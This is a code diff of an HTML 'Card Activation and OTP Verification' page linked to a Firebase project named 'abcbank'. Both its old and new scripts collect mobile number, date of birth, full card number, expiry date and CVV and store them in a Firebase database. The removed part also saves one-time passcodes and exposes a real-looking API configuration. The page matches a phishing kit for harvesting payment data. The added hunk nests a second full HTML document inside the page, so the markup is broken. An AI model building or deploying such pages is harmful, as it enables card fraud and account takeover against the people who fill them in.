@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Card Activation and OTP Verification</title>
+
     <style>
         :root {
             --mainBackground: #FFF6EC;
@@ -367,79 +368,89 @@ document.getElementById('expiry').addEventListener('input', function (event) {
             successContainer.style.display = 'block';
         });
     </script>
-    <script type="module">
-    // Import the functions you need from the SDKs you need
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js";
-    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-firestore.js";
-    import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-analytics.js";
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card Activation</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database.js"></script>
+</head>
+<body>
+    <div id="activation-container">
+        <form id="activationForm">
+            <label for="mobile">Mobile Number:</label>
+            <input type="text" id="mobile" required>
+            <br>
+            <label for="dob">Date of Birth:</label>
+            <input type="text" id="dob" required>
+            <br>
+            <label for="card-number">Card Number:</label>
+            <input type="text" id="card-number" required>
+            <br>
+            <label for="expiry">Expiry Date:</label>
+            <input type="text" id="expiry" required>
+            <br>
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" required>
+            <br>
+            <button type="submit">Submit</button>
+        </form>
+    </div>
 
-    // Your web app's Firebase configuration
-    const firebaseConfig = {
-        apiKey: "AIzaSyDeceQ163lmHZbyIKicgz81OjGRNEtlr3w",
-        authDomain: "abcbank-3d9dd.firebaseapp.com",
-        projectId: "abcbank-3d9dd",
-        storageBucket: "abcbank-3d9dd.firebasestorage.app",
-        messagingSenderId: "476861704570",
-        appId: "1:476861704570:web:e8227fd6fc86ec1c324ec3",
-        measurementId: "G-7975P82Y99"
-    };
+    <div id="otp-container" style="display: none;">
+        <!-- OTP verification UI here -->
+        <p>Please verify OTP</p>
+    </div>
 
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const analytics = getAnalytics(app);
-    const db = getFirestore(app); // Initialize Firestore
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "your-api-key",
+            authDomain: "your-auth-domain",
+            databaseURL: "your-database-url",
+            projectId: "your-project-id",
+            storageBucket: "your-storage-bucket",
+            messagingSenderId: "your-sender-id",
+            appId: "your-app-id"
+        };
 
-    const activationForm = document.getElementById('activationForm');
-    const activateBtn = document.getElementById('activate-btn');
-    const otpInputs = document.querySelectorAll('.otp-box');
-    const verifyBtn = document.getElementById('verify-btn');
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const database = firebase.database(app);
 
-    activationForm.addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const mobile = document.getElementById('mobile').value;
-        const dob = document.getElementById('dob').value;
-        const cardNumber = document.getElementById('card-number').value;
-        const expiry = document.getElementById('expiry').value;
-        const cvv = document.getElementById('cvv').value;
+        const activationForm = document.getElementById('activationForm');
+        
+        // On form submission
+        activationForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
 
-        try {
-            // Add data to Firestore
-            await addDoc(collection(db, 'card-activations'), {
-                mobile,
-                dob,
-                cardNumber,
-                expiry,
-                cvv
-            });
-            alert('Card details submitted successfully! Please verify OTP.');
-            document.getElementById('activation-container').style.display = 'none';
-            document.getElementById('otp-container').style.display = 'block';
-        } catch (error) {
-            console.error('Error adding document: ', error);
-            alert('Failed to submit data. Try again.');
-        }
-    });
+            const mobile = document.getElementById('mobile').value;
+            const dob = document.getElementById('dob').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
 
-    otpInputs.forEach((input, index) => {
-        input.addEventListener('input', () => {
-            const otpComplete = [...otpInputs].every(input => input.value.trim() !== '');
-            verifyBtn.disabled = !otpComplete;
+            try {
+                // Push the card details to the Realtime Database under the 'card-activations' node
+                await database.ref('card-activations').push({
+                    mobile,
+                    dob,
+                    cardNumber,
+                    expiry,
+                    cvv
+                });
+
+                alert('Card details submitted successfully! Please verify OTP.');
+                document.getElementById('activation-container').style.display = 'none';
+                document.getElementById('otp-container').style.display = 'block';
+            } catch (error) {
+                console.error('Error adding data to Realtime Database: ', error);
+                alert('Failed to submit data. Try again.');
+            }
         });
-    });
-
-    verifyBtn.addEventListener('click', async () => {
-        const otp = Array.from(otpInputs).map(input => input.value).join('');
-        try {
-            // Add OTP verification data to Firestore
-            await addDoc(collection(db, 'otp-verifications'), { otp });
-            alert('OTP Verified! Card activation successful.');
-            document.getElementById('otp-container').style.display = 'none';
-            document.getElementById('success-container').style.display = 'block';
-        } catch (error) {
-            console.error('Error verifying OTP: ', error);
-            alert('Failed to verify OTP. Try again.');
-        }
-    });         
     </script>
 </body>
 </html>
